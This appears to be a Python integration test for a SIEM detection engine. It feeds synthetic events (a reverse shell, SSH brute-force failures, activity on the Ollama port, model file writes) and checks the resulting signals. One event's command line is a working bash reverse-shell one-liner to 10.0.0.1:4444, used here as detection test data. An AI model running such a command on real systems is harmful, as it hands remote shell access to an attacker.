"""test_integration_v6.py — End-to-end integration test (v6).

Verifies that run_all() correctly:
  1. Dispatches Linux events through the Linux pipeline
  2. Runs AI detection (ai_network, ai_integrity) unconditionally
  3. Deduplicates signals that share evidence_event_ids across modules
  4. Preserves AML.* MITRE technique format through deduplication

Run:
    cd SIEM_V6
    export PYTHONPATH=src
    python tests/test_integration_v6.py
"""
from __future__ import annotations

import sys, os, platform
from datetime import datetime, timezone, timedelta

_HERE = os.path.dirname(os.path.abspath(__file__))
_SRC  = os.path.join(os.path.dirname(_HERE), "src")
if _SRC not in sys.path:
    sys.path.insert(0, _SRC)

from core.schemas import CanonicalEvent, HostRef, UserRef, ProcessRef, FileRef, NetworkRef
from detect.modules.ai_baseline import _LEARNED_PATH

PASS = 0; FAIL = 0
def check(name, cond, detail=""):
    global PASS, FAIL
    if cond: PASS += 1; print(f"  PASS  {name}")
    else:    FAIL += 1; print(f"  FAIL  {name}" + (f" - {detail}" if detail else ""))


def _ev(source="syslog", etype="process", proc="bash", pid=1000, img="/bin/bash",
        cmd="", fp="", op="", port=0, dest_ip="", username="user", uid="1000",
        raw_extra=None, off=0):
    ts = datetime(2026,3,17,12,0,0,tzinfo=timezone.utc) + timedelta(seconds=off)
    raw = {"timestamp": ts.isoformat(), "source": source, "host": "host-mixed",
           "command_line": cmd, "process_name": proc, "pid": pid, "ppid": 999,
           "file_path": fp or None, "operation": op or None,
           "port": port or None, "dest_ip": dest_ip or None,
           "username": username, "uid": uid, **(raw_extra or {})}
    return CanonicalEvent(
        event_id=f"int-{pid}-{off}", event_time_utc=ts, ingest_time_utc=ts,
        source=source, event_type=etype, host=HostRef(hostname="host-mixed"),
        user=UserRef(username=username, sid=uid),
        process=ProcessRef(name=proc, pid=pid, ppid=999, image_path=img, command_line=cmd),
        file=FileRef(path=fp or None, operation=op or None,
                     extension=fp.split(".")[-1].lower() if "." in fp else "",
                     directory="/".join(fp.split("/")[:-1]) if "/" in fp else ""),
        network=NetworkRef(dest_ip=dest_ip or None, dest_port=port or None),
        raw=raw)


# cleanup learned AI baseline before test
if _LEARNED_PATH.exists():
    _LEARNED_PATH.unlink()

if platform.system() != "Linux":
    print("SKIP: integration test requires Linux pipeline")
    sys.exit(0)

from detect.engine import run_all

print("\n-- Scenario: mixed Linux + AI events --")

events = [
    # Linux reverse shell (bash_sigma + linux_auditd both match)
    _ev(cmd="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", source="auditd",
        raw_extra={"type": "EXECVE"}, off=0),
    # SSH brute force (5 failures)
    *[_ev(source="auth", etype="auth", off=10+i,
          raw_extra={"message": f"Failed password for invalid user admin from 192.168.1.99 port 22 ssh2"})
      for i in range(5)],
    # AI: unexpected process binding known Ollama port
    _ev(proc="python3", port=11434, source="auditd",
        raw_extra={"syscall": "49", "type": "SYSCALL"}, off=20),
    # AI: model file write (first observation, builds baseline)
    _ev(proc="ollama", fp="/root/.ollama/models/llama3.gguf", op="write",
        source="auditd", raw_extra={"type": "PATH", "file_hash": "hash-aaa"}, off=21),
]

sigs = run_all(events)

check("run_all returns signals", len(sigs) > 0)

types = [s.signal_type for s in sigs]
check("AI signal present (ai.unexpected_process_on_ai_port)",
      any("ai.unexpected_process_on_ai_port" in t or "ai_network" in t or "ai." in t for t in types),
      f"types: {types}")

check("brute force signal present",
      any("brute_force" in t for t in types), f"types: {types}")

# Check AML technique survives in output
aml_sigs = [s for s in sigs if "AML." in (s.mitre_technique or "")]
check("AML.* MITRE technique preserved", len(aml_sigs) > 0,
      f"techniques: {[s.mitre_technique for s in sigs]}")

# Empty events no crash
sigs_empty = run_all([])
check("empty events no crash", sigs_empty == [])

if _LEARNED_PATH.exists():
    _LEARNED_PATH.unlink()

print(f"\n{'='*60}")
print(f"  Results: {PASS} passed, {FAIL} failed")
if FAIL: sys.exit(1)
